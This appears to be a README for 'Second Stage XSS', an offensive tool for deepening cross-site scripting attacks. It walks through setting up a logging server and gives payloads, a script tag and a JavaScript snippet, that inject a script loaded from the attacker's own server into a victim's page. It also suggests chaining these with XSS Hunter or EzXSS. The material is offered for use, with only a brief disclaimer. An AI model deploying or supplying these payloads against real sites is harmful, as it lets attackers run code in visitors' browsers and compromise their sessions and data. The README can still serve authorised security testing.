# SSX
**Second Stage XSS**, This tool will help you to exploit XSS more deeply.

**Installation:**

1. Clone this project
2. This app need permission to write on current directory, for creating and update log
3. Change base URL in file en.js with your server address, example

```javascript
var base_url = "https://yourweb/ssx/ping.php";
```

**How to use:**

Send payload XSS and pointing to your server, such as: <script src=//yourserver/en.js></script>

You can integrate with xss hunter or EzXSS by adding a secondary payload as follows:

```javascript
var js = document.createElement("script");
js.type = "text/javascript";
js.src = "https://yourserver/en.js";
document.body.appendChild(js);
```

More info: https://dimazarno.medium.com/second-stage-xss-ssx-cd42d6e519c5

**Please don't install it on a production server, and use it wisely, I am not responsible if there is damage / loss using this tool !!**

Happy hunting!
